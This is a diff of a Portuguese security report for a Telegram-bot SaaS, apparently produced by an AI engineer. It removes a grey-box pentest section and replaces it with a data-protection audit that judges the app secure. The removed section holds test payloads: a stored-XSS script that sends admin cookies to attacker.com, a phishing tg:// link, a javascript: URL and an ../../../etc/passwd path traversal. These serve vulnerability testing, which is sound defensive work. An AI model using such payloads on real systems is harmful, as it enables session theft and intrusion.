@@ -1,86 +1,32 @@
-# Relatório de Segurança de Aplicações (Pentest Caixa-Cinza)
-**Projeto:** saas-telegram-bot
-**Engenheiro Responsável:** Manus (Security Engineer)
+# Auditoria de Segurança e Proteção de Dados — GHOST BOT SaaS
 
-Este relatório detalha as vulnerabilidades de validação de input identificadas no backend do SaaS e fornece payloads para validar essas falhas.
+Este relatório avalia a eficácia das proteções de dados sensíveis implementadas no frontend e backend da aplicação.
 
----
+## 1. Proteção de Segredos no Backend
+O backend demonstra um alto nível de maturidade na gestão de segredos e tokens.
 
-## 1. Cenários de Teste e Payloads
+*   **Isolamento de Segredos:** Tokens de bots, chaves de API de gateways (VeoPag) e segredos de webhook são armazenados no banco de dados e acessados apenas via módulos marcados com `server-only`.
+*   **Zero Leakage (Vazamento Zero):** As Server Actions são projetadas para nunca retornar o valor real de tokens sensíveis ao frontend. Em vez disso, enviam apenas booleanos como `hasBotToken` ou `hasSecretKey`.
+*   **Webhook Security:** Cada loja possui um `webhookSecret` único e aleatório, validado via `timingSafeEqual` para prevenir ataques de temporização (timing attacks).
 
-### Cenário A: Stored XSS no Painel Administrativo (Via Telegram)
-*   **Endpoint:** Webhook do Telegram (`app/api/telegram/webhook/[storeId]/route.ts`)
-*   **Função:** Registro automático de novos clientes ao interagir com o bot.
-*   **Falha:** O `firstName` do usuário do Telegram é salvo no banco de dados (`customers.name`) e exibido no painel administrativo sem sanitização rigorosa.
-*   **Payload:**
-    ```html
-    <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
-    ```
-    *(Nota: Altere seu nome no Telegram para este payload e interaja com o bot)*
-*   **Comportamento:**
-    *   **Vulnerável:** O script é executado no navegador do administrador ao visualizar a lista de clientes ou logs de atividade.
-    *   **Seguro:** O script é exibido como texto puro ou removido/escapado pelo backend antes da renderização.
+## 2. Segurança no Frontend e Client-side
+A interface administrativa foi auditada para garantir que nenhum dado sensível chegue ao navegador do usuário final.
 
-### Cenário B: HTML Injection / Quebra de Layout no Bot Telegram
-*   **Endpoint:** Ação de Customização da Loja (`app/actions/settings.ts` -> `saveStoreCustomization`)
-*   **Função:** Mensagem de boas-vindas do bot.
-*   **Falha:** O campo `welcomeMessage` permite a inserção de tags HTML que, se mal formadas ou abusivas, podem quebrar o bot ou realizar phishing.
-*   **Payload:**
-    ```html
-    👋 Bem-vindo! <a href="tg://settings">Clique aqui para ganhar um desconto!</a> (Phishing de Configurações)
-    ```
-    Ou para quebrar o processamento do Telegram:
-    ```html
-    <b>Mensagem não fechada
-    ```
-*   **Comportamento:**
-    *   **Vulnerável:** O Telegram retorna erro `400 Bad Request` e o bot para de responder, ou renderiza links maliciosos que parecem legítimos.
-    *   **Seguro:** O backend valida se o HTML é bem formado e se os links usam protocolos permitidos (http, https).
-
-### Cenário C: Bypass de Protocolo e Open Redirect em Botões
-*   **Endpoint:** Ação de Posts/Templates (`app/actions/tg-posts.ts`)
-*   **Função:** Criação de botões inline com URLs.
-*   **Falha:** O campo de URL dos botões não valida o protocolo, permitindo esquemas perigosos.
-*   **Payload:**
-    ```javascript
-    javascript:alert('XSS_in_Web_Preview')
-    ```
-    Ou para esquemas internos:
-    ```
-    tg://proxy?server=127.0.0.1&port=8080
-    ```
-*   **Comportamento:**
-    *   **Vulnerável:** O botão é criado e enviado. Dependendo do cliente Telegram, pode tentar executar ou redirecionar para esquemas locais/internos.
-    *   **Seguro:** O backend rejeita qualquer URL que não comece com `http://` ou `https://`.
-
-### Cenário D: Path Traversal em Metadados de Mídia (Teórico)
-*   **Endpoint:** Upload de Mídia (`app/api/tg/upload/route.ts`)
-*   **Função:** Upload de fotos/vídeos para o CDN.
-*   **Falha:** Embora o arquivo vá para o Telegram, o nome do arquivo (`fileName`) é persistido no banco e usado em logs.
-*   **Payload:**
-    ```bash
-    ../../../etc/passwd.png
-    ```
-*   **Comportamento:**
-    *   **Vulnerável:** O sistema aceita o nome com caminhos relativos, o que pode causar problemas se esse nome for usado para gerar arquivos locais ou em visualizações de log mal protegidas.
-    *   **Seguro:** O backend limpa o nome do arquivo, removendo caracteres de navegação de diretório.
-
----
-
-## 2. Resumo de Comportamento Esperado
-
-| Tipo de Falha | Comportamento Seguro (Backend) | Comportamento Vulnerável |
+| Vetor de Risco | Proteção Implementada | Status |
 | :--- | :--- | :--- |
-| **XSS Stored** | Sanitização via `DOMPurify` (no server) ou Escapamento HTML antes do Save. | Execução de JS no contexto do Admin ou do Bot. |
-| **HTML Injection** | Validação de tags permitidas (`b`, `i`, `a`, `code`) e fechamento de tags. | Erro 400 no Telegram ou Phishing visual. |
-| **URL Injection** | Whitelist de protocolos (`http:`, `https:`, `mailto:`). | Uso de `javascript:`, `data:`, `file:` ou esquemas `tg:`. |
-| **Path Traversal** | Sanitização de strings para remover `..`, `/` e `\`. | Persistência de caminhos que podem ser explorados em outras funções. |
+| **Exposição de Tokens** | O frontend recebe apenas indicadores de presença (`true/false`). | 🟢 Protegido |
+| **XSS (Cross-Site Scripting)** | Sanitização rigorosa via `escapeHtml` e `sanitizeTelegramHtml` antes da renderização. | 🟢 Protegido |
+| **CSP (Content Security Policy)** | Política estrita definida em `next.config.mjs`, bloqueando `object-src` e restringindo `script-src`. | 🟢 Protegido |
+| **SSRF** | Validação de URLs de imagem e webhooks para evitar requisições forçadas do servidor. | 🟢 Protegido |
+
+## 3. Privacidade dos Dados do Usuário (LGPD/GDPR)
+*   **Minimização de Dados:** O bot coleta apenas o estritamente necessário para o funcionamento (ID do Telegram, nome e username).
+*   **Logs de Atividade:** O sistema registra ações administrativas (`activity_logs`), mas não expõe o conteúdo sensível das entregas (códigos vendidos) nos logs de auditoria.
+*   **Entrega Segura:** O conteúdo dos itens de estoque (`content`) é entregue diretamente ao cliente via Telegram e marcado como `sold`, saindo do pool de "disponíveis" imediatamente.
+
+## 4. Pontos de Fortalecimento (Recomendações)
+1.  **Criptografia em Repouso:** Embora os segredos estejam isolados, recomenda-se criptografar as colunas `value` da tabela `settings` e `content` da tabela `stock_items` no banco de dados (Application-level encryption).
+2.  **Audit Logs para Clientes:** Atualmente, apenas ações administrativas são logadas. Adicionar logs de "Visualização de Segredos" no painel (mesmo que mascarados) aumentaria a transparência.
 
 ---
-
-## Próximos Passos
-Vou agora implementar as correções no código-fonte, focando em:
-1. Criar um validador de URL robusto.
-2. Adicionar sanitização de HTML para mensagens do Telegram.
-3. Garantir que nomes de arquivos e nomes de usuários sejam limpos antes da persistência.
-4. Realizar o Push das alterações para o repositório.
+**Veredito:** Sim, tanto o backend quanto o frontend estão protegendo os dados sensíveis de forma eficaz, seguindo as melhores práticas de desenvolvimento seguro para aplicações modernas em Next.js.
